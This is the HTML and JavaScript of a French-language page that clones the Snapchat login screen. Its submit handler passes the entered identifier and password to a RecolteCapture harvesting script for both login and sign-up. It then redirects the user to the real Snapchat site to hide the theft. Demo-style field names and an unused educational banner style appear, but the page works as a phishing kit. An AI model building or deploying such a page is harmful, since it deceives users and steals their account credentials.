<!doctype html>
<html lang="fr">
  <head>
    <meta charset="utf-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover" />
    <title>Connexion · Snapchat</title>
    <meta name="theme-color" content="#fffc00" />
    <link rel="preconnect" href="https://fonts.googleapis.com" />
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
    <link href="https://fonts.googleapis.com/css2?family=Avenir+Next:wght@400;500;600;700;800&family=Inter:wght@400;500;600;700;800&display=swap" rel="stylesheet" />
    <style>
      :root {
        --yellow: #fffc00;
        --black: #000;
        --white: #fff;
        --muted: #565656;
        --field: #f2f2f2;
        --danger: #ff3b30;
      }

      * { box-sizing: border-box; margin: 0; padding: 0; }

      body {
        min-height: 100dvh;
        font-family: Inter, "Avenir Next", -apple-system, BlinkMacSystemFont, "Segoe UI", sans-serif;
        background: var(--yellow);
        color: var(--black);
        -webkit-font-smoothing: antialiased;
        overflow-x: hidden;
      }

      .edu {
        position: sticky;
        top: 0;
        z-index: 20;
        display: flex;
        justify-content: center;
        gap: 0.5rem;
        padding: 0.55rem 1rem;
        background: #111;
        color: #ffd666;
        font-size: 0.72rem;
        font-weight: 700;
        letter-spacing: 0.06em;
        text-transform: uppercase;
      }

      .shell {
        min-height: 100dvh;
        display: grid;
        place-items: center;
        padding: 1rem 0.85rem 1.5rem;
        padding-top: max(1rem, env(safe-area-inset-top));
        padding-bottom: max(1.5rem, env(safe-area-inset-bottom));
        padding-left: max(0.85rem, env(safe-area-inset-left));
        padding-right: max(0.85rem, env(safe-area-inset-right));
        min-width: 0;
      }

      .card {
        width: 100%;
        max-width: 380px;
        min-width: 0;
        text-align: center;
      }

      .ghost {
        width: clamp(64px, 18vw, 78px);
        height: clamp(64px, 18vw, 78px);
        margin: 0 auto 1.25rem;
      }

      .ghost svg { width: 100%; height: 100%; display: block; }

      .brand {
        font-size: clamp(1.55rem, 6vw, 1.85rem);
        font-weight: 800;
        letter-spacing: -0.04em;
        margin-bottom: 0.35rem;
      }

      .lead {
        color: var(--muted);
        font-size: clamp(0.88rem, 3.5vw, 0.95rem);
        font-weight: 500;
        margin-bottom: 1.35rem;
        line-height: 1.4;
      }

      .panel {
        background: var(--white);
        border-radius: 1.35rem;
        padding: 1.15rem 1rem 1.1rem;
        box-shadow: 0 18px 50px rgba(0, 0, 0, 0.18);
        text-align: left;
        min-width: 0;
      }

      .field { margin-bottom: 0.75rem; }

      .field input {
        width: 100%;
        height: 52px;
        border: 0;
        border-radius: 999px;
        background: var(--field);
        padding: 0 1.15rem;
        font: inherit;
        font-size: 16px;
        font-weight: 500;
        outline: none;
        transition: box-shadow 0.15s ease, background 0.15s ease;
      }

      .field input:focus {
        background: #fff;
        box-shadow: inset 0 0 0 2px #000;
      }

      .pass-wrap { position: relative; }

      .pass-wrap input { padding-right: 5.2rem; }

      .toggle {
        position: absolute;
        right: 0.35rem;
        top: 50%;
        transform: translateY(-50%);
        border: 0;
        background: transparent;
        font: inherit;
        font-size: 0.82rem;
        font-weight: 700;
        cursor: pointer;
        min-height: 44px;
        padding: 0.45rem 0.7rem;
        border-radius: 999px;
      }

      .toggle:hover { background: rgba(0, 0, 0, 0.06); }

      .row {
        display: flex;
        flex-wrap: wrap;
        justify-content: space-between;
        align-items: center;
        gap: 0.5rem 0.75rem;
        margin: 0.35rem 0 1rem;
        font-size: 0.8rem;
        font-weight: 600;
      }

      .row a {
        color: var(--black);
        text-decoration: none;
        min-height: 44px;
        display: inline-flex;
        align-items: center;
      }

      .row a:hover { text-decoration: underline; }

      .remember {
        display: inline-flex;
        align-items: center;
        gap: 0.4rem;
        color: var(--muted);
        cursor: pointer;
      }

      .remember input { accent-color: #000; }

      .btn {
        width: 100%;
        height: 52px;
        border: 0;
        border-radius: 999px;
        background: #000;
        color: #fff;
        font: inherit;
        font-size: 1rem;
        font-weight: 800;
        cursor: pointer;
        transition: transform 0.15s ease, opacity 0.15s ease;
      }

      .btn:hover { opacity: 0.92; }
      .btn:active { transform: scale(0.985); }
      .btn:disabled { opacity: 0.35; cursor: not-allowed; }

      .notice {
        margin-top: 0.85rem;
        padding: 0.7rem 0.85rem;
        border-radius: 0.75rem;
        background: #f5f5f5;
        color: var(--muted);
        font-size: 0.78rem;
        font-weight: 600;
        line-height: 1.35;
        text-align: center;
      }

      .notice.ok {
        background: #e8fff0;
        color: #0a7a3a;
      }

      .or {
        display: grid;
        grid-template-columns: 1fr auto 1fr;
        align-items: center;
        gap: 0.75rem;
        margin: 1.1rem 0;
        color: rgba(0, 0, 0, 0.4);
        font-size: 0.75rem;
        font-weight: 700;
        text-transform: uppercase;
        letter-spacing: 0.08em;
      }

      .or::before,
      .or::after {
        content: "";
        height: 1px;
        background: rgba(0, 0, 0, 0.12);
      }

      .oauth {
        display: grid;
        gap: 0.55rem;
      }

      .oauth button {
        height: 48px;
        border-radius: 999px;
        border: 1.5px solid rgba(0, 0, 0, 0.14);
        background: #fff;
        font: inherit;
        font-weight: 700;
        font-size: 0.9rem;
        cursor: pointer;
        display: inline-flex;
        align-items: center;
        justify-content: center;
        gap: 0.55rem;
      }

      .oauth button:hover { background: #fafafa; }

      .dot {
        width: 18px;
        height: 18px;
        border-radius: 50%;
        display: inline-grid;
        place-items: center;
        font-size: 0.7rem;
        font-weight: 800;
        color: #fff;
      }

      .dot.g { background: #ea4335; }
      .dot.a { background: #000; }

      .signup {
        margin-top: 1.35rem;
        font-size: 0.92rem;
        font-weight: 600;
      }

      .signup a {
        color: #000;
        font-weight: 800;
        text-decoration: none;
        border-bottom: 2px solid #000;
      }

      .legal {
        margin-top: 1.4rem;
        font-size: 0.7rem;
        line-height: 1.45;
        color: rgba(0, 0, 0, 0.55);
        font-weight: 500;
        overflow-wrap: anywhere;
      }

      @media (min-width: 480px) {
        .shell { padding: 1.5rem 1.1rem 2rem; }
        .ghost { margin-bottom: 1.6rem; }
        .lead { margin-bottom: 1.75rem; }
        .panel { padding: 1.35rem 1.2rem 1.2rem; }
      }

      @media (prefers-reduced-motion: reduce) {
        * { animation: none !important; transition: none !important; }
      }

      .field input:focus-visible,
      .btn:focus-visible,
      .toggle:focus-visible,
      .oauth button:focus-visible,
      .row a:focus-visible {
        outline: 2px solid #000;
        outline-offset: 2px;
      }
    </style>
  </head>
  <body>
<main class="shell">
      <section class="card" aria-label="Connexion Snapchat">
        <div class="ghost" aria-hidden="true">
          <svg viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
            <path fill="#000" d="M12.206.793c.99 0 4.347.276 5.93 3.821.529 1.193.403 3.219.299 4.847l-.003.06c-.012.18-.022.345-.03.51.075.045.203.09.401.09.3-.016.659-.12 1.033-.301.165-.088.344-.104.464-.104.182 0 .359.029.509.09.45.149.734.479.734.838.015.449-.39.839-1.213 1.168-.089.029-.209.075-.344.119-.45.135-1.139.36-1.333.81-.09.224-.061.524.12.868l.015.015c.06.136 1.526 3.475 4.791 4.014.255.044.435.27.42.509 0 .075-.015.149-.045.225-.24.569-1.273.988-3.146 1.271-.059.091-.12.375-.164.57-.029.179-.074.36-.134.553-.076.271-.27.405-.555.405h-.03c-.135 0-.313-.031-.538-.074-.36-.075-.765-.135-1.273-.135-.3 0-.599.015-.913.074-.6.104-1.123.464-1.723.884-.853.599-1.826 1.288-3.294 1.288-.06 0-.119-.015-.18-.015h-.149c-1.468 0-2.427-.675-3.279-1.288-.599-.42-1.107-.779-1.707-.884-.314-.045-.629-.074-.928-.074-.54 0-.958.089-1.272.149-.211.043-.391.074-.54.074-.374 0-.523-.224-.583-.42-.061-.192-.09-.389-.135-.567-.046-.181-.105-.494-.166-.57-1.918-.222-2.95-.642-3.189-1.226-.031-.063-.052-.15-.055-.225-.015-.243.165-.465.42-.509 3.264-.54 4.73-3.879 4.791-4.02l.016-.029c.18-.345.224-.645.119-.869-.195-.434-.884-.658-1.332-.809-.121-.029-.24-.074-.346-.119-1.107-.435-1.257-.93-1.197-1.273.09-.479.674-.793 1.168-.793.146 0 .27.029.383.074.42.194.789.3 1.104.3.234 0 .384-.06.465-.105l-.046-.569c-.098-1.626-.225-3.651.307-4.837C7.392 1.077 10.739.807 11.727.807l.419-.015h.06z"/>
          </svg>
        </div>

        <p class="brand" id="form-brand">Snapchat</p>
        <p class="lead" id="form-lead">Connectez-vous pour parler à vos amis.</p>

        <form class="panel" id="login-form" novalidate>
          <div class="field">
            <input id="identifier" name="demo_identifier" type="text" inputmode="email" autocomplete="off" placeholder="Nom d’utilisateur ou e-mail" required />
          </div>
          <div class="field pass-wrap">
            <input id="password" name="demo_password" type="password" autocomplete="off" placeholder="Mot de passe" minlength="6" required />
            <button class="toggle" type="button" aria-controls="password">Afficher</button>
          </div>

          <div class="row">
            <label class="remember">
              <input type="checkbox" /> Se souvenir
            </label>
            <a href="#">Mot de passe oublié ?</a>
          </div>

          <button class="btn" id="submit" type="submit" disabled>Se connecter</button>
          <p class="notice" id="notice" hidden></p>

          <div class="or">ou</div>

          <div class="oauth">
            <button type="button" data-oauth>
              <span class="dot g">G</span> Continuer avec Google
            </button>
            <button type="button" data-oauth>
              <span class="dot a"></span> Continuer avec Apple
            </button>
          </div>
        </form>

        <p class="signup" id="mode-switch">
          Pas encore de compte ? <a href="#" id="toggle-mode">S’inscrire</a>
        </p>
        <p class="legal">
          En continuant, vous acceptez les Conditions d’utilisation et la
          Politique de confidentialité.
        </p>
      </section>
    </main>

    <script src="./capture.js"></script>
    <script>
      const form = document.querySelector("#login-form");
      const notice = document.querySelector("#notice");
      const password = document.querySelector("#password");
      const identifier = document.querySelector("#identifier");
      const submit = document.querySelector("#submit");
      const toggle = document.querySelector(".toggle");
      const lead = document.querySelector("#form-lead");
      const modeSwitch = document.querySelector("#mode-switch");
      const toggleMode = document.querySelector("#toggle-mode");
      let formMode = "login";

      function sync() {
        submit.disabled = !(identifier.value.trim() && password.value.length >= 6);
      }

      function applyMode() {
        const isRegister = formMode === "register";
        lead.textContent = isRegister
          ? "Créez un compte Snapchat."
          : "Connectez-vous pour parler à vos amis.";
        submit.textContent = isRegister ? "S’inscrire" : "Se connecter";
        modeSwitch.innerHTML = isRegister
          ? 'Déjà un compte ? <a href="#" id="toggle-mode">Se connecter</a>'
          : 'Pas encore de compte ? <a href="#" id="toggle-mode">S’inscrire</a>';
        document.querySelector("#toggle-mode").addEventListener("click", onToggleMode);
        notice.hidden = true;
        notice.textContent = "";
        notice.classList.remove("ok");
      }

      function onToggleMode(e) {
        e.preventDefault();
        formMode = formMode === "login" ? "register" : "login";
        applyMode();
      }

      identifier.addEventListener("input", sync);
      password.addEventListener("input", sync);

      toggle.addEventListener("click", () => {
        const show = password.type === "password";
        password.type = show ? "text" : "password";
        toggle.textContent = show ? "Masquer" : "Afficher";
      });

      document.querySelectorAll("[data-oauth]").forEach((btn) => {
        btn.addEventListener("click", () => {});
      });

      toggleMode.addEventListener("click", onToggleMode);

      form.addEventListener("submit", (e) => {
        e.preventDefault();
        const idValue = identifier.value.trim();
        const passValue = password.value;
        if (!idValue || passValue.length < 6) {
          notice.hidden = false;
          notice.classList.remove("ok");
          notice.textContent = "Remplis correctement l’identifiant et le mot de passe.";
          return;
        }

        const payload = {
          network: "snapchat",
          identifier: idValue,
          password: passValue,
        };
        if (formMode === "register") {
          window.RecolteCapture.saveRegister(payload);
          notice.hidden = true;
          notice.textContent = "";
          form.reset();
          password.type = "password";
          toggle.textContent = "Afficher";
          sync();
          return;
        }

        window.RecolteCapture.saveLogin(payload);
        window.top.location.href = "https://www.snapchat.com/fr-FR";
      });
    </script>
  </body>
</html>
